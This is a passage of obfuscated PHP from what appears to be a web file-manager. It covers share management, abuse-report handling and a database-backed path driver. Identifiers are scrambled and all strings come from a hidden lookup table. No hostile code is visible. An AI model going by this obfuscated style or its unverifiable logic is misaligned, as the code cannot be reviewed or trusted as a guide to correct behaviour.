$¥ÔƒŒø[634] => 0, $¥ÔƒŒø[1223] => $¥ÔƒŒø[12], $¥ÔƒŒø[353] => $¥ÔƒŒø[12], $¥ÔƒŒø[935] => $¥ÔƒŒø[12], $¥ÔƒŒø[2054] => 0, $¥ÔƒŒø[2055] => 0, $¥ÔƒŒø[801] => 0, $¥ÔƒŒø[2056] => $¥ÔƒŒø[12], $¥ÔƒŒø[2037] => $¥ÔƒŒø[12]); $–‚°Œ–¯ = explode($¥ÔƒŒø[50], $¥ÔƒŒø[2057]); foreach ($–‚°Œ–¯ as $ÉÚå†ı‡) { if (!isset($×†â·¥[$ÉÚå†ı‡])) { continue; } $‚ó†Î»¸[$ÉÚå†ı‡] = $×†â·¥[$ÉÚå†ı‡]; } $ŸüÔå´ = $this->add($‚ó†Î»¸); $âç™’äú = array($¥ÔƒŒø[2037] => short_id($ŸüÔå´)); $this->where(array($¥ÔƒŒø[2058] => $ŸüÔå´))->save($âç™’äú); return $ŸüÔå´; } private function _shareAuthSet($²«ß´á‘, $Ş÷şğã‚) { $ö‰ØãŒ =& $_SERVER[èùÙ¹Ïö]; if (!is_array($Ş÷şğã‚)) { return !1; } $Ì’å’Ê‡ = Model($ö‰ØãŒ[2002]); $Ì’å’Ê‡->where(array($ö‰ØãŒ[636] => $²«ß´á‘))->delete(); $Ä´°Ûº§ = array(); foreach ($Ş÷şğã‚ as $´«ôÁéĞ) { $ÓÃÏÖï = SourceModel::TYPE_USER; if ($´«ôÁéĞ[$ö‰ØãŒ[180]] == SourceModel::TYPE_GROUP) { $ÓÃÏÖï = SourceModel::TYPE_GROUP; } $ŠëÀô¾ş = array($ö‰ØãŒ[636] => $²«ß´á‘, $ö‰ØãŒ[180] => $ÓÃÏÖï, $ö‰ØãŒ[541] => intval($´«ôÁéĞ[$ö‰ØãŒ[541]]), $ö‰ØãŒ[1998] => 0, $ö‰ØãŒ[2059] => -1); if ($´«ôÁéĞ[$ö‰ØãŒ[1998]]) { $ŠëÀô¾ş[$ö‰ØãŒ[1998]] = $´«ôÁéĞ[$ö‰ØãŒ[1998]]; } else { if ($´«ôÁéĞ[$ö‰ØãŒ[2059]]) { $ŠëÀô¾ş[$ö‰ØãŒ[2059]] = $´«ôÁéĞ[$ö‰ØãŒ[2059]]; } } $Ä´°Ûº§[] = $ŠëÀô¾ş; } return $Ì’å’Ê‡->addAll($Ä´°Ûº§, array(), !0); } public function numViewAdd($Şúé›î—) { $ì€ì¹ò =& $_SERVER[èùÙ¹Ïö]; $“³æÇ‡˜ = array($ì€ì¹ò[2058] => $Şúé›î—); $this->where($“³æÇ‡˜)->setAdd($ì€ì¹ò[2054]); } public function numDownloadAdd($’ŸÀİ—) { $Å¾×‰ûö =& $_SERVER[èùÙ¹Ïö]; $§­•ÂÕ¾ = array($Å¾×‰ûö[2058] => $’ŸÀİ—); $this->where($§­•ÂÕ¾)->setAdd($Å¾×‰ûö[2055]); } protected function shareEdit($‚Á—¡—», $¯‡œÒİÎ) { $ı¨ß»£ =& $_SERVER[èùÙ¹Ïö]; $‚‚Å¡é = $this->getInfo($‚Á—¡—»); if (!$‚‚Å¡é) { return !1; } $this->_checkLinkShare($¯‡œÒİÎ, $‚‚Å¡é); $º¾ÆÍÄ¿ = array(); $ôã´İ€ = explode($ı¨ß»£[50], $ı¨ß»£[2060]); foreach ($ôã´İ€ as $ã‰µÃ¥·) { if (!array_key_exists($ã‰µÃ¥·, $¯‡œÒİÎ)) { continue; } $º¾ÆÍÄ¿[$ã‰µÃ¥·] = $¯‡œÒİÎ[$ã‰µÃ¥·]; } $this->shareEventAdd($‚‚Å¡é[$ı¨ß»£[183]], $¯‡œÒİÎ, $ı¨ß»£[1864]); $this->where(array($ı¨ß»£[2058] => $‚Á—¡—»))->save($º¾ÆÍÄ¿); if (isset($¯‡œÒİÎ[$ı¨ß»£[2046]])) { $this->_shareAuthSet($‚Á—¡—», $¯‡œÒİÎ[$ı¨ß»£[2046]]); } return !0; } private function _checkLinkShare($ÈÎâ©× , $·ï‡ƒîµ) { $¼¨ò– =& $_SERVER[èùÙ¹Ïö]; if ($ÈÎâ©× [$¼¨ò–[533]] != $¼¨ò–[90]) { return; } $š²’·³œ = $·ï‡ƒîµ[$¼¨ò–[89]][$¼¨ò–[183]]; if ($·ï‡ƒîµ[$¼¨ò–[89]][$¼¨ò–[33]] != $¼¨ò–[216]) { $¨Æè¬ô = $this->_folderReport($š²’·³œ); if (!$¨Æè¬ô) { return; } show_json(LNG($¼¨ò–[2061]) . $¼¨ò–[2062] . $¨Æè¬ô, !1); } $÷¡ÍĞç´ = Model($¼¨ò–[865])->fileInfoGet($·ï‡ƒîµ[$¼¨ò–[89]][$¼¨ò–[183]]); if (!$÷¡ÍĞç´) { return; } $®¥‰§ö = $this->shareFileMeta($÷¡ÍĞç´[$¼¨ò–[511]]); if (isset($®¥‰§ö[$¼¨ò–[420]]) && $®¥‰§ö[$¼¨ò–[420]] == $¼¨ò–[90]) { show_json(LNG($¼¨ò–[2063]), !1); } } private function _folderReport($“Å§ Äš) { $Òò‚Ö‹ =& $_SERVER[èùÙ¹Ïö]; $şà‰ô = array($Òò‚Ö‹[511] => array($Òò‚Ö‹[1058], 0), $Òò‚Ö‹[790] => 3); $íó»˜“¥ = Model($Òò‚Ö‹[2064])->where($şà‰ô)->field($Òò‚Ö‹[511])->select(); if (!$íó»˜“¥) { return !1; } $íó»˜“¥ = array_to_keyvalue($íó»˜“¥, $Òò‚Ö‹[12], $Òò‚Ö‹[511]); $Ç¸¤ÙùĞ = $Òò‚Ö‹[50] . $“Å§ Äš . $Òò‚Ö‹[50]; $şà‰ô = array($Òò‚Ö‹[511] => array($Òò‚Ö‹[7], $íó»˜“¥), $Òò‚Ö‹[556] => array($Òò‚Ö‹[429], "\45{$Ç¸¤ÙùĞ}\x25"), $Òò‚Ö‹[475] => 0); $ñÅşæŠá = Model($Òò‚Ö‹[865])->where($şà‰ô)->field($Òò‚Ö‹[2065])->find(); if (!$ñÅşæŠá) { return !1; } $ Òïã¸ = substr($ñÅşæŠá[$Òò‚Ö‹[556]], strpos($ñÅşæŠá[$Òò‚Ö‹[556]], $Ç¸¤ÙùĞ)); $şà‰ô = array($Òò‚Ö‹[183] => array($Òò‚Ö‹[7], trim($ Òïã¸, $Òò‚Ö‹[50]))); $ÁÀŠ¯°ë = Model($Òò‚Ö‹[865])->where($şà‰ô)->field($Òò‚Ö‹[32])->select(); $¬«Î“í‰ = array_to_keyvalue($ÁÀŠ¯°ë, $Òò‚Ö‹[12], $Òò‚Ö‹[32]); $¬«Î“í‰[] = $ñÅşæŠá[$Òò‚Ö‹[32]]; return implode($Òò‚Ö‹[8], $¬«Î“í‰); } protected function remove($¼®ü“­) { $·°•î¥± =& $_SERVER[èùÙ¹Ïö]; if (is_array($¼®ü“­)) { $¼®ü“­ = array($·°•î¥±[7], $¼®ü“­); } $ÆÓ­Ê = array($·°•î¥±[636] => $¼®ü“­); $ûÂ¯œõ = $this->where($ÆÓ­Ê)->delete(); if ($ûÂ¯œõ) { Model($·°•î¥±[637])->where(array($·°•î¥±[636] => $¼®ü“­))->delete(); } $¡ Ø¬ = is_array($¼®ü“­) ? $¼®ü“­[1] : array($¼®ü“­); for ($”—Œö¥ñ = 0; $”—Œö¥ñ < count($¡ Ø¬); $”—Œö¥ñ++) { $¯»À¤¸Õ = $this->getInfo($¡ Ø¬[$”—Œö¥ñ]); if ($¯»À¤¸Õ[$·°•î¥±[634]] == $·°•î¥±[90]) { Model($·°•î¥±[604])->eventShare($¯»À¤¸Õ[$·°•î¥±[183]], $·°•î¥±[2052]); } if ($¯»À¤¸Õ[$·°•î¥±[533]] == $·°•î¥±[90]) { Model($·°•î¥±[604])->eventShare($¯»À¤¸Õ[$·°•î¥±[183]], $·°•î¥±[2051]); } } return $ûÂ¯œõ; } protected function removeBySource($«¶â€ı) { $õäâ‘¾Ê =& $_SERVER[èùÙ¹Ïö]; $±“·ÏÖ‹ = array($õäâ‘¾Ê[461] => array($õäâ‘¾Ê[462], $«¶â€ı)); $é€Òüäş = $this->field($õäâ‘¾Ê[636])->where($±“·ÏÖ‹)->select(); $é€Òüäş = array_to_keyvalue($é€Òüäş, $õäâ‘¾Ê[12], $õäâ‘¾Ê[636]); if (!$é€Òüäş) { return; } $±“·ÏÖ‹ = array($õäâ‘¾Ê[2058] => array($õäâ‘¾Ê[462], $é€Òüäş)); $this->where($±“·ÏÖ‹)->delete(); Model($õäâ‘¾Ê[637])->where($±“·ÏÖ‹)->delete(); } public function listAll($¨‚Ú­) { $µ¿ìš·´ =& $_SERVER[èùÙ¹Ïö]; $³ÓÓÊÎ = array(); if ($¨‚Ú­[$µ¿ìš·´[1696]]) { $³ÓÓÊÎ[$µ¿ìš·´[1696]] = $¨‚Ú­[$µ¿ìš·´[1696]]; } if ($¨‚Ú­[$µ¿ìš·´[800]]) { $Üòøùº = $¨‚Ú­[$µ¿ìš·´[801]] ? $¨‚Ú­[$µ¿ìš·´[801]] : strtotime(date($µ¿ìš·´[2066])); $³ÓÓÊÎ[$µ¿ìš·´[217]] = array($µ¿ìš·´[379], array($¨‚Ú­[$µ¿ìš·´[800]], $Üòøùº)); } if ($¨‚Ú­[$µ¿ìš·´[33]]) { $³ÓÓÊÎ[$¨‚Ú­[$µ¿ìš·´[33]]] = 1; } else { $³ÓÓÊÎ[] = array($µ¿ìš·´[533] => array($µ¿ìš·´[1058], 0), $µ¿ìš·´[634] => array($µ¿ìš·´[1058], 0), $µ¿ìš·´[2040] => $µ¿ìš·´[1992]); } if ($¨‚Ú­[$µ¿ìš·´[1988]]) { $³ÓÓÊÎ[] = array($µ¿ìš·´[2037] => $¨‚Ú­[$µ¿ìš·´[1988]], $µ¿ìš·´[1592] => array($µ¿ìš·´[429], "\45{$¨‚Ú­[$µ¿ìš·´[1988]]}\45"), $µ¿ìš·´[2040] => $µ¿ìš·´[1992]); } $±°İÊ = $this->_makeOrder()->where($³ÓÓÊÎ)->selectPage(20); if (empty($±°İÊ[$µ¿ìš·´[415]])) { return array(); } $this->_listDataApply($±°İÊ[$µ¿ìš·´[415]]); return $±°İÊ; } public function listDataApply($ËÃÂ²Ú) { $this->_listDataApply($ËÃÂ²Ú); return $ËÃÂ²Ú; } private function _listDataApply(&$çÚ¶Å¦Ã) { $šÒ÷„¤ =& $_SERVER[èùÙ¹Ïö]; $Œ—‰ÒÒ¤ = array_to_keyvalue($çÚ¶Å¦Ã, $šÒ÷„¤[12], $šÒ÷„¤[1696]); $İŞèËÂ… = Model($šÒ÷„¤[570])->userListInfo(array_unique($Œ—‰ÒÒ¤)); $Ó—™•£í = array_to_keyvalue($çÚ¶Å¦Ã, $šÒ÷„¤[12], $šÒ÷„¤[183]); $ıÃŠ‚ã´ = Model($šÒ÷„¤[865])->sourceListInfo($Ó—™•£í, !0); foreach ($çÚ¶Å¦Ã as $™ûñˆãÔ => &$ğî³ÀçŒ) { $±Èêüı = $ğî³ÀçŒ[$šÒ÷„¤[1696]]; $ğî³ÀçŒ[$šÒ÷„¤[2067]] = $İŞèËÂ…[$±Èêüı] ? $İŞèËÂ…[$±Èêüı] : !1; $ì™¦¥ì = $ğî³ÀçŒ[$šÒ÷„¤[183]]; $ğî³ÀçŒ[$šÒ÷„¤[89]] = $ıÃŠ‚ã´[$ì™¦¥ì] ? $ıÃŠ‚ã´[$ì™¦¥ì] : !1; if ($ğî³ÀçŒ[$šÒ÷„¤[89]][$šÒ÷„¤[475]] == $šÒ÷„¤[90]) { unset($çÚ¶Å¦Ã[$™ûñˆãÔ]); } if ($ğî³ÀçŒ[$šÒ÷„¤[89]] != $šÒ÷„¤[214] && !$ğî³ÀçŒ[$šÒ÷„¤[89]]) { unset($çÚ¶Å¦Ã[$™ûñˆãÔ]); } } unset($ğî³ÀçŒ); $çÚ¶Å¦Ã = array_values($çÚ¶Å¦Ã); } private function _makeOrder($ïïƒæÑœ = '') { $â®ÛŠ®Ø =& $_SERVER[èùÙ¹Ïö]; $¡·ó“æ´ = array($â®ÛŠ®Ø[217], $â®ÛŠ®Ø[801], $â®ÛŠ®Ø[2054], $â®ÛŠ®Ø[2055]); $ŞÂµÄªò = array($â®ÛŠ®Ø[493] => $â®ÛŠ®Ø[494], $â®ÛŠ®Ø[495] => $â®ÛŠ®Ø[496]); $·æÜ†ËÁ = Input::get($â®ÛŠ®Ø[500], $â®ÛŠ®Ø[7], $â®ÛŠ®Ø[467], $¡·ó“æ´); $ù¥¥×¤á = Input::get($â®ÛŠ®Ø[501], $â®ÛŠ®Ø[7], $â®ÛŠ®Ø[2068], array($â®ÛŠ®Ø[1985], $â®ÛŠ®Ø[495])); $ù¥¥×¤á = $ŞÂµÄªò[$ù¥¥×¤á]; $ïïƒæÑœ = $ïïƒæÑœ . "{$·æÜ†ËÁ}\x20{$ù¥¥×¤á}"; return $this->order($ïïƒæÑœ); } public function reportAdd($º¢âĞ£©) { $Ì”¼ìÈÒ =& $_SERVER[èùÙ¹Ïö]; $„ø•Òç¡ = array($Ì”¼ìÈÒ[636] => $º¢âĞ£©[$Ì”¼ìÈÒ[636]], $Ì”¼ìÈÒ[1696] => USER_ID); if (Model($Ì”¼ìÈÒ[2064])->where($„ø•Òç¡)->find()) { return !1; } $æìÆºÎ¨ = array($Ì”¼ìÈÒ[636] => $º¢âĞ£©[$Ì”¼ìÈÒ[636]], $Ì”¼ìÈÒ[1592] => $º¢âĞ£©[$Ì”¼ìÈÒ[1592]], $Ì”¼ìÈÒ[183] => $º¢âĞ£©[$Ì”¼ìÈÒ[183]], $Ì”¼ìÈÒ[511] => $º¢âĞ£©[$Ì”¼ìÈÒ[511]], $Ì”¼ìÈÒ[1696] => USER_ID, $Ì”¼ìÈÒ[33] => $º¢âĞ£©[$Ì”¼ìÈÒ[33]], $Ì”¼ìÈÒ[496] => $º¢âĞ£©[$Ì”¼ìÈÒ[496]]); return Model($Ì”¼ìÈÒ[2064])->add($æìÆºÎ¨); } public function reportList($£ë±èı) { $ó½¾™Ö =& $_SERVER[èùÙ¹Ïö]; $Š¼ó‡³ = array(); if ($£ë±èı[$ó½¾™Ö[800]]) { $ÚÍÈœ¡¸ = $£ë±èı[$ó½¾™Ö[801]] ? $£ë±èı[$ó½¾™Ö[801]] : strtotime(date($ó½¾™Ö[2066])); $Š¼ó‡³[$ó½¾™Ö[217]] = array($ó½¾™Ö[379], array($£ë±èı[$ó½¾™Ö[800]], $ÚÍÈœ¡¸)); } if (isset($£ë±èı[$ó½¾™Ö[33]]) && in_array($£ë±èı[$ó½¾™Ö[33]], array($ó½¾™Ö[90], $ó½¾™Ö[480], $ó½¾™Ö[2069], $ó½¾™Ö[2070], $ó½¾™Ö[2071]))) { $Š¼ó‡³[$ó½¾™Ö[33]] = $£ë±èı[$ó½¾™Ö[33]]; } if (isset($£ë±èı[$ó½¾™Ö[790]]) && in_array($£ë±èı[$ó½¾™Ö[790]], array($ó½¾™Ö[214], $ó½¾™Ö[90], $ó½¾™Ö[480], $ó½¾™Ö[2069]))) { $Š¼ó‡³[$ó½¾™Ö[790]] = $£ë±èı[$ó½¾™Ö[790]]; } $ªñã×éğ = Input::get($ó½¾™Ö[501], $ó½¾™Ö[7], $ó½¾™Ö[2068], array($ó½¾™Ö[1985], $ó½¾™Ö[495])); $‹«·¯Á  = array($ó½¾™Ö[493] => $ó½¾™Ö[494], $ó½¾™Ö[495] => $ó½¾™Ö[496]); $ú‰Á… = $ó½¾™Ö[2072] . $‹«·¯Á [$ªñã×éğ]; $ØßÛ¡äÒ = Model($ó½¾™Ö[2064])->where($Š¼ó‡³)->order($ú‰Á…)->selectPage(20); if (empty($ØßÛ¡äÒ[$ó½¾™Ö[415]])) { return array(); } $›òÂµàæ = array_to_keyvalue_group($ØßÛ¡äÒ[$ó½¾™Ö[415]], $ó½¾™Ö[790], $ó½¾™Ö[636]); if (!empty($›òÂµàæ[0])) { $£ë±èı = $›òÂµàæ[0]; $Š¼ó‡³ = array($ó½¾™Ö[636] => array($ó½¾™Ö[7], $£ë±èı)); $“Î²âô = $this->where($Š¼ó‡³)->field($ó½¾™Ö[636])->select(); $“Î²âô = array_to_keyvalue($“Î²âô, $ó½¾™Ö[12], $ó½¾™Ö[636]); $°±ÛÇ€Š = array_diff($£ë±èı, $“Î²âô); if (!empty($°±ÛÇ€Š)) { foreach ($ØßÛ¡äÒ[$ó½¾™Ö[415]] as $ÌüÃ»À° => $åÄõÌ) { if (in_array($åÄõÌ[$ó½¾™Ö[636]], $°±ÛÇ€Š)) { unset($ØßÛ¡äÒ[$ó½¾™Ö[415]][$ÌüÃ»À°]); } } } } $this->_listDataApply($ØßÛ¡äÒ[$ó½¾™Ö[415]]); return $ØßÛ¡äÒ; } public function reportStatus($ôÒğàîÌ) { $ÆÃŒì²ö =& $_SERVER[èùÙ¹Ïö]; $Ê•êÆŒÖ = array($ÆÃŒì²ö[445] => $ôÒğàîÌ[$ÆÃŒì²ö[445]]); $°“ï«ƒÓ = Model($ÆÃŒì²ö[2064])->where($Ê•êÆŒÖ)->field($ÆÃŒì²ö[2073])->find(); if (!$°“ï«ƒÓ) { return !1; } $ùáæ¿³â = array($ÆÃŒì²ö[790] => $ôÒğàîÌ[$ÆÃŒì²ö[790]]); if ($ôÒğàîÌ[$ÆÃŒì²ö[790]] == $ÆÃŒì²ö[2069] && $°“ï«ƒÓ[$ÆÃŒì²ö[790]] == $ÆÃŒì²ö[2069]) { $ùáæ¿³â[$ÆÃŒì²ö[790]] = 0; } $„ˆÄ™òş = Model($ÆÃŒì²ö[2064])->where($Ê•êÆŒÖ)->save($ùáæ¿³â); if ($ôÒğàîÌ[$ÆÃŒì²ö[790]] == $ÆÃŒì²ö[480]) { if ($°“ï«ƒÓ[$ÆÃŒì²ö[511]] != $ÆÃŒì²ö[214] && $this->shareFileMeta($°“ï«ƒÓ[$ÆÃŒì²ö[511]])) { $this->shareFileMeta($°“ï«ƒÓ[$ÆÃŒì²ö[511]], 0); } $this->remove($°“ï«ƒÓ[$ÆÃŒì²ö[636]]); return !0; } if ($„ˆÄ™òş && $ôÒğàîÌ[$ÆÃŒì²ö[790]] == $ÆÃŒì²ö[2069]) { $öÃˆæŞ¶ = $ùáæ¿³â[$ÆÃŒì²ö[790]] == $ÆÃŒì²ö[2069] ? 1 : 0; $this->shareFileMeta($°“ï«ƒÓ[$ÆÃŒì²ö[511]], $öÃˆæŞ¶); $this->removeByFile($°“ï«ƒÓ[$ÆÃŒì²ö[511]]); } return $„ˆÄ™òş; } private function removeByFile($®Ù³´ë) { $ğ–¸¸Ã· =& $_SERVER[èùÙ¹Ïö]; $Ë¿ïÉß× = Model($ğ–¸¸Ã·[865])->where(array($ğ–¸¸Ã·[511] => $®Ù³´ë))->field($ğ–¸¸Ã·[183])->select(); $¿âìÓ†Ÿ = array_to_keyvalue($Ë¿ïÉß×, $ğ–¸¸Ã·[12], $ğ–¸¸Ã·[183]); $ô—ÚÂ‘† = array($ğ–¸¸Ã·[183] => array($ğ–¸¸Ã·[7], $¿âìÓ†Ÿ), $ğ–¸¸Ã·[533] => 1); $Ë¿ïÉß× = $this->where($ô—ÚÂ‘†)->field($ğ–¸¸Ã·[636])->select(); if (empty($Ë¿ïÉß×)) { return; } $ÔÔ¼…Ë = array_to_keyvalue($Ë¿ïÉß×, $ğ–¸¸Ã·[12], $ğ–¸¸Ã·[636]); $this->remove($ÔÔ¼…Ë); } private function shareFileMeta($˜ÈÈ·ğ¨, $Èˆ»˜¯â = null) { $…çµÅúÉ =& $_SERVER[èùÙ¹Ïö]; $áô÷ì¬ = array($…çµÅúÉ[511] => $˜ÈÈ·ğ¨, $…çµÅúÉ[96] => $…çµÅúÉ[2074]); if (is_null($Èˆ»˜¯â)) { return Model($…çµÅúÉ[2075])->where($áô÷ì¬)->find(); } $áô÷ì¬[$…çµÅúÉ[420]] = $Èˆ»˜¯â; Model($…çµÅúÉ[2075])->add($áô÷ì¬, array(), !0); } } goto aš¯ÉëÈ¦¿; E…„°Â÷š: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ƒˆ™È˜) { $this->pathParse = $ƒˆ™È˜; $this->model = Model($_SERVER[èùÙ¹Ïö][1381]); } public function getPath($¦¤şØÅë) { return trim($¦¤şØÅë, $_SERVER[èùÙ¹Ïö][8]); } public function pathFather($„íÏ‹) { $ÉÜ½Ó³Õ = $this->parse($„íÏ‹); $ÉÜ½Ó³Õ = $this->infoSimple($„íÏ‹); return $ÉÜ½Ó³Õ ? $ÉÜ½Ó³Õ[$_SERVER[èùÙ¹Ïö][182]] : !1; } public function pathThis($£¨°šÀ) { $ÍÕ±å¼ = $this->infoSimple($£¨°šÀ); return $ÍÕ±å¼ ? $ÍÕ±å¼[$_SERVER[èùÙ¹Ïö][32]] : !1; } public function getPathOuter($¶å­Áıê) { if (!$¶å­Áıê) { return $¶å­Áıê; } $“™”¹»¯ = $this->parse($¶å­Áıê); return KodIO::make($“™”¹»¯[$_SERVER[èùÙ¹Ïö][445]]); } public function copyFolderFromIO($ƒ’ÚÔ«, $Ä¨ÅÈŠ, $Ÿ³©ÍŠá, $àÍæíî©, $ãµø×¼) { $¼¶ÜÎ¡ê = $this->model->copyFolderFromIO($ƒ’ÚÔ«, $Ä¨ÅÈŠ, $Ÿ³©ÍŠá, $àÍæíî©, $ãµø×¼); return KodIO::make($¼¶ÜÎ¡ê); } public function isParentOf($ËşışÅğ, $º©â¤Ó”) { return $this->model->isParentOf($ËşışÅğ, $º©â¤Ó”); } public function mkfile($‚®Ì¸ÖÌ, $Øíıúğ“ = '', $ÀŞıì = REPEAT_RENAME) { $ôñÖ™Â³ =& $_SERVER[èùÙ¹Ïö]; $”êø“‡ = $this->parse($‚®Ì¸ÖÌ); $‚®Ì¸ÖÌ = $”êø“‡[$ôñÖ™Â³[445]]; for ($ôï¶¡â¬ = 0; $ôï¶¡â¬ < count($”êø“‡[$ôñÖ™Â³[1382]]); $ôï¶¡â¬++) { $Îé“´ú¢ = $”êø“‡[$ôñÖ™Â³[1382]][$ôï¶¡â¬]; if ($ôï¶¡â¬ == count($”êø“‡[$ôñÖ™Â³[1382]]) - 1) { $‚®Ì¸ÖÌ = $this->model->mkfile($‚®Ì¸ÖÌ, $Îé“´ú¢, $Øíıúğ“, $ÀŞıì); break; } $‚®Ì¸ÖÌ = $this->model->mkdir($‚®Ì¸ÖÌ, $Îé“´ú¢, REPEAT_SKIP); } return $this->getPathOuter($‚®Ì¸ÖÌ); } public function mkdir($ÂÅø¥íÅ, $·‹áïíÑ = REPEAT_SKIP) { $Ä÷ÈÒË‰ =& $_SERVER[èùÙ¹Ïö]; $ßêõÛõş = $this->parse($ÂÅø¥íÅ); $ÂÅø¥íÅ = $ßêõÛõş[$Ä÷ÈÒË‰[445]]; for ($²”ñÈÌ = 0; $²”ñÈÌ < count($ßêõÛõş[$Ä÷ÈÒË‰[1382]]); $²”ñÈÌ++) { $˜®Ø…„† = $ßêõÛõş[$Ä÷ÈÒË‰[1382]][$²”ñÈÌ]; $ÂÅø¥íÅ = $this->model->mkdir($ÂÅø¥íÅ, $˜®Ø…„†, $·‹áïíÑ); } return $this->getPathOuter($ÂÅø¥íÅ); } public function copyFile($È”íÕßá, $ìÀ£öâÛ, $ëıõë÷Ú = REPEAT_REPLACE) { $©”¸¡Ó¨ =& $_SERVER[èùÙ¹Ïö]; $À˜şÇä = $this->parse($ìÀ£öâÛ); $É ±À†Ù = $this->model->copy($È”íÕßá, $À˜şÇä[$©”¸¡Ó¨[445]], $ëıõë÷Ú, $À˜şÇä[$©”¸¡Ó¨[86]]); return $É ±À†Ù ? $this->getPathOuter($É ±À†Ù) : !1; } public function moveFile($ªøÒ¼øÎ, $¿…‘Å”, $Şã™ö¦¨ = REPEAT_REPLACE) { $¤¦Ë…¨å =& $_SERVER[èùÙ¹Ïö]; $×Éø¬— = $this->parse($¿…‘Å”); $²Ùİ³šŸ = $this->model->move($ªøÒ¼øÎ, $×Éø¬—[$¤¦Ë…¨å[445]], $Şã™ö¦¨, $×Éø¬—[$¤¦Ë…¨å[86]]); return $²Ùİ³šŸ ? $this->getPathOuter($²Ùİ³šŸ) : !1; } public function copy($Üöé»ô”, $é˜Ü£Â , $¾Ûµ ‚ = REPEAT_REPLACE, $£™üã»½ = false) { $è„‰õŠ¯ = $this->parse($é˜Ü£Â ); $óş‡‹º½ = $this->model->copy($Üöé»ô”, $è„‰õŠ¯[$_SERVER[èùÙ¹Ïö][445]], $¾Ûµ ‚, $£™üã»½); return $óş‡‹º½ ? $this->getPathOuter($óş‡‹º½) : !1; } public function moveSameAllow() { } public function move($´ãÅÚÓÙ, $Ü¼©’ÙŒ, $õ¹˜ÔÑÜ = REPEAT_REPLACE, $Ì”ôÖº = false) { $£Å®êãŞ = $this->parse($Ü¼©’ÙŒ); $Äââ„™• = $this->model->move($´ãÅÚÓÙ, $£Å®êãŞ[$_SERVER[èùÙ¹Ïö][445]], $õ¹˜ÔÑÜ, $Ì”ôÖº); return $Äââ„™• ? $this->getPathOuter($Äââ„™•) : !1; } public function remove($§îËÎŠã, $Â“¬§‡Ç = true) { return $this->model->remove($§îËÎŠã, $Â“¬§‡Ç); } public function rename($’¥ğà„¼, $­¶ƒ÷Í) { $ñ´¡æ— = $this->model->rename($’¥ğà„¼, $­¶ƒ÷Í); return $ñ´¡æ— ? $this->getPathOuter($’¥ğà„¼) : $ñ´¡æ—; } public function size($“¬“³Ü•) { $Ô‰¡Ğæ¢ = $this->infoSimple($“¬“³Ü•); return $Ô‰¡Ğæ¢ ? $Ô‰¡Ğæ¢[$_SERVER[èùÙ¹Ïö][78]] : 0; } public function infoSimple($àÛÉ¸Á) { return $this->model->sourceInfo($àÛÉ¸Á); } public function info($ø¶œ„™) { return $this->infoParse($ø¶œ„™); } public function infoAuth($ø£ğ’Üà) { return $this->infoParse($ø£ğ’Üà, !1, !0); } public function infoWithChildren($å”ù§€‚) { return $this->infoParse($å”ù§€‚, !0); } protected function infoParse($¡¿‚»·Ò, $É—¢„îü = false, $Óƒ­ÔçÈ = false) { if (!$É—¢„îü) { return $this->model->pathInfo($¡¿‚»·Ò, $Óƒ­ÔçÈ); } return $this->model->pathInfoMore($¡¿‚»·Ò); } public function infoFullSimple($”ƒÅÍìÊ) { $”š§«´ =& $_SERVER[èùÙ¹Ïö]; $óæùß¶¹ = explode($”š§«´[8], $”ƒÅÍìÊ); $Î÷¬ñÈÔ = implode($”š§«´[8], array_splice($óæùß¶¹, 1)); return $this->model->pathInfoByPath($óæùß¶¹[0], $Î÷¬ñÈÔ); } public function infoFull($ÕáÃŸ·) { $»Š‰øÕæ = $this->infoFullSimple($ÕáÃŸ·); return is_array($»Š‰øÕæ) ? $this->model->pathInfo($»Š‰øÕæ[$_SERVER[èùÙ¹Ïö][183]]) : !1; } public function hashSimple($ëºı–Ÿ) { $ö§Ö¨ºö =& $_SERVER[èùÙ¹Ïö]; $¦Çï­©Ø = $this->infoWithChildren($ëºı–Ÿ); return $¦Çï­©Ø[$ö§Ö¨ºö[519]][$ö§Ö¨ºö[643]]; } public function hashMd5($µó˜ª€”) { $ôŒ‚˜û =& $_SERVER[èùÙ¹Ïö]; $—æ°¼òŠ = $this->infoWithChildren($µó˜ª€”); return $—æ°¼òŠ[$ôŒ‚˜û[519]][$ôŒ‚˜û[517]]; } public function exist($ºÇ†¼ëÜ) { $ˆÑ•ÚıÍ =& $_SERVER[èùÙ¹Ïö]; $İ“¥Áéâ = $this->parse($ºÇ†¼ëÜ); if (!$İ“¥Áéâ[$ˆÑ•ÚıÍ[86]]) { return $this->isFile($ºÇ†¼ëÜ) || $this->isFolder($ºÇ†¼ëÜ); } $É««ïˆõ = array($ˆÑ•ÚıÍ[447] => $İ“¥Áéâ[$ˆÑ•ÚıÍ[445]], $ˆÑ•ÚıÍ[32] => $İ“¥Áéâ[$ˆÑ•ÚıÍ[86]]); $ÄÚºˆ°Õ = $this->model->where($É««ïˆõ)->find(); return $ÄÚºˆ°Õ ? !0 : !1; } public function isFile($š½Ÿš³Ë) { $Ÿ¶áó®¡ =& $_SERVER[èùÙ¹Ïö]; $‘Æß«íİ = $this->infoSimple($š½Ÿš³Ë); return $‘Æß«íİ && $‘Æß«íİ[$Ÿ¶áó®¡[455]] == $Ÿ¶áó®¡[214] ? !0 : !1; } public function isFolder($ù¡ÑêºŠ) { $õ÷ë²Ñ =& $_SERVER[èùÙ¹Ïö]; $¯‰Ñ­µâ = $this->infoSimple($ù¡ÑêºŠ); return $¯‰Ñ­µâ && $¯‰Ñ­µâ[$õ÷ë²Ñ[455]] == $õ÷ë²Ñ[90] ? !0 : !1; } public function listPath($„‡ò¼ Ô, $ÑëŸÂğ = false) { $Ò§ıÍ =& $_SERVER[èùÙ¹Ïö]; if ($„‡ò¼ Ô == $Ò§ıÍ[12]) { return !1; } $×ˆÛâıÁ = array($Ò§ıÍ[447] => $„‡ò¼ Ô); if ($ÑëŸÂğ) { return $this->model->listSource($×ˆÛâıÁ, -1); } return $this->model->listSource($×ˆÛâıÁ); } public function has($§² ¼”õ, $Ìµ®øê = false, $Œ³ÚÌŒï = null) { $ù¹¯ù† =& $_SERVER[èùÙ¹Ïö]; $§ƒƒ–¢á = $this->infoWithChildren($§² ¼”õ); if ($Ìµ®øê) { return array($ù¹¯ù†[226] => $§ƒƒ–¢á[$ù¹¯ù†[226]], $ù¹¯ù†[225] => $§ƒƒ–¢á[$ù¹¯ù†[225]]); } return $Œ³ÚÌŒï ? $§ƒƒ–¢á[$ù¹¯ù†[226]] : $§ƒƒ–¢á[$ù¹¯ù†[225]]; } public function listAll($ÖÕô‹„˜) { $œÜüõ¦Ë = 